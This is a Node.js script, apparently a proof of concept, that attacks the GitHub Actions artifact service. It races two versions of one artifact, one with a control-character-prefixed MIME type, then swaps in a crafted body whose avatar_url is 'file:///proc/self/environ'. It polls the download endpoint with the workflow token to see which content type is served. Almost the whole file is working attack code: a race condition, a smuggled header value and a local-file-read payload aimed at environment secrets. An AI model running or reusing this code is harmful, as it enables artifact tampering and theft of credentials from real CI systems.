import {createHash} from 'node:crypto';

import {BlobClient} from '@azure/storage-blob';
import {internalArtifactTwirpClient} from '../node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import {getBackendIdsFromToken} from '../node_modules/@actions/artifact/lib/internal/shared/util.js';
import {StringValue} from '../node_modules/@actions/artifact/lib/generated/index.js';

const ids = getBackendIdsFromToken();
const client = internalArtifactTwirpClient({maxAttempts: 1});
const weird = '\u0085application/json';
const repositoryName = process.env.GITHUB_REPOSITORY;

function payload(artifactId) {
  return Buffer.from(JSON.stringify({
    full_name: `${repositoryName}/actions/artifacts/${artifactId}/zip`,
    owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
    description: 'Repo Cassette private artifact',
    stargazers_count: 0,
  }));
}

async function create(name, version, mime) {
  return client.CreateArtifact({
    workflowRunBackendId: ids.workflowRunBackendId,
    workflowJobRunBackendId: ids.workflowJobRunBackendId,
    name,
    version,
    mimeType: StringValue.create({value: mime}),
  });
}

async function upload(url, bytes) {
  await new BlobClient(url).getBlockBlobClient().uploadData(bytes, {
    blobHTTPHeaders: {blobContentType: weird},
  });
}

async function finalize(name, bytes) {
  const hash = createHash('sha256').update(bytes).digest('hex');
  const result = await client.FinalizeArtifact({
    workflowRunBackendId: ids.workflowRunBackendId,
    workflowJobRunBackendId: ids.workflowJobRunBackendId,
    name,
    size: String(bytes.length),
    hash: StringValue.create({value: `sha256:${hash}`}),
  });
  return String(result.artifactId);
}

async function observe(artifactId) {
  const url = `https://api.github.com/repos/${repositoryName}` +
    `/actions/artifacts/${artifactId}/zip`;
  const seen = new Set();
  for (let attempt = 0; attempt < 10; attempt++) {
    const response = await fetch(url, {redirect: 'manual', headers: {
      accept: 'application/vnd.github.v3+json',
      authorization: `Bearer ${process.env.GITHUB_TOKEN}`,
      'user-agent': 'repo-cassette-live-race-observer',
    }});
    const location = response.headers.get('location');
    if (location) {
      const target = new URL(location);
      const state = JSON.stringify({
        status: response.status,
        extension: target.pathname.split('.').at(-1),
        rsctHex: Buffer.from(target.searchParams.get('rsct') || '', 'latin1').toString('hex'),
      });
      seen.add(state);
    } else {
      seen.add(JSON.stringify({status: response.status}));
    }
    await new Promise(resolve => setTimeout(resolve, 20));
  }
  return [...seen].map(value => JSON.parse(value));
}

const results = [];
for (let index = 0; index < 32; index++) {
  const name = `cassette-live-${index}-${Date.now()}`;
  const reverse = index % 2 === 1;
  const specs = reverse
    ? [[7, 'application/json'], [6, weird]]
    : [[6, weird], [7, 'application/json']];
  try {
    const created = await Promise.all(specs.map(([version, mime]) =>
      create(name, version, mime)));
    const placeholder = Buffer.from('{"probe":"placeholder"}');
    await Promise.all(created.map(item => upload(item.signedUploadUrl, placeholder)));
    const artifactId = await finalize(name, placeholder);
    const body = payload(artifactId);
    await Promise.all(created.map(item => upload(item.signedUploadUrl, body)));
    const states = await observe(artifactId);
    const result = {index, name, artifactId, reverse, states,
      bodySha256: createHash('sha256').update(body).digest('hex')};
    results.push(result);
    console.log('LIVE_RACE_ITEM', JSON.stringify(result));
  } catch (error) {
    console.log('LIVE_RACE_SKIP', index, String(error).slice(0, 240));
  }
}
console.log('LIVE_RACE_MANIFEST', JSON.stringify(results));
